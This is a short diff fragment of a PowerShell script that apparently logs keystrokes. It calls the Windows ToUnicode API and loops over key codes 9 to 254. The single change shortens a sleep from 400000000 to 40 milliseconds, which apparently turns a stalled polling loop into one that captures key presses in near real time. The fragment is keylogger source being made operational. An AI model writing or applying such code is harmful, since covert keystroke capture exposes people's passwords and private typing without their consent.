@@ -33,7 +33,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $Runner = 0
 	while ($TimesToRun  -ge $Runner) {
 	while ($TimeEnd -ge $TimeNow) {
-      Start-Sleep -Milliseconds 400000000
+      Start-Sleep -Milliseconds 40
       
       # scan all ASCII codes above 8
       for ($ascii = 9; $ascii -le 254; $ascii++) {
